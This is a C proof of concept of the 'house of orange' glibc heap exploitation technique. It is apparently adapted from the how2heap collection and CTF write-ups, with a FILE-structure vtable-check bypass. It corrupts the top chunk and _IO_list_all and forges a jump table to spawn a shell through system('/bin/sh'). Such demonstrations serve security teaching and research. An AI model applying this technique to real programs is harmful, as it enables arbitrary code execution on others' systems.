#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/*
Angelboy house of orange write up: http://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html
house_of_orange.c where this code is based on: https://github.com/shellphish/how2heap/blob/master/glibc_2.25/house_of_orange.c
vtable check bypass: https://dhavalkapil.com/blogs/FILE-Structure-Exploitation/

might crash sometimes if it does run it again.
if not a bunch of stuff after the file struct etc is null the program might sigabrt so if it does try nulling more values after the file struct etc
there is a 'xor eax, eax ; call rdx' gadget in libc and since we can control rdx we can use to setup a reliable one gadget where rax needs to be null.
*/

int winner ();

int main()
{
    char *p1, *p2;
    size_t io_list_all, *top;

    p1 = malloc(0x400-16);

    top = (size_t *) ( (char *) p1 + 0x400 - 16);
    top[1] = 0xc01;

    p2 = malloc(0x1000);

    io_list_all = top[2] + 0x9a8;
 
    top[3] = io_list_all - 0x10;

    top[1] = 0x61; //this can also be a bigger size up to and including 0x1f1

    _IO_FILE *fp = (_IO_FILE *) top;

    fp->_mode = 0; // top+0xc0

    fp->_IO_write_base = (char *) 2; // top+0x20
    fp->_IO_write_ptr = (char *) 0x1337c0de; // top+0x28 ; rdx

    size_t *_IO_file_jumps = *(size_t *) ( (char *) stdout + 0xd8);
    size_t *jump_table = (size_t *) ( (char *) _IO_file_jumps + 0xd8 - 0x18); // controlled memory
    *(size_t *) ((size_t) fp + sizeof(_IO_FILE)) = (size_t) jump_table; // top+0xd8
    *(size_t *) ((size_t) fp + sizeof(_IO_FILE) + sizeof(void*)) = (size_t) &winner; // top+0xe0 ; rip

    malloc(10);

    return 0;
}

int winner()
{ 
    system("/bin/sh");
    return 0;
}
